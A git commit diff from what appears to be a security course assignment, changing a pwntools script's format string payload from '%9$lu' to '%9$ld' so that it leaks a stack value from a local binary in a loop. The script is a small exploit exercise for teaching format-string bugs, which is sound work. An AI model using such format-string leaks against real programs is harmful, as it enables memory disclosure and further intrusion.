08a4b81a7e5e6b4609257248a6ac6bbed8b745f7
ashleyjwu <155711021+ashleyjwu@users.noreply.github.com>
2025-11-07 22:11:35 +0000

    update datatype

--- assignment-2/1-format-me/part1.py
+++ assignment-2/1-format-me/part1.py
@@ -10,7 +10,7 @@ r = process([exe.path])
 for _ in range(10):
     # Add your code Here
     r.recvuntil(b"Recipient? ") # Think about what should be received first?
-    r.sendline(b"%9$lu") # Add your format string code here!
+    r.sendline(b"%9$ld") # Add your format string code here!
     leak = r.recvline()
     # Add your code to receive leak val here , format: val = leak[idx_1:idx_2], please think about the idx
     val = leak[11:-1] # you need to fill in idx_1, and idx_2 by yourself
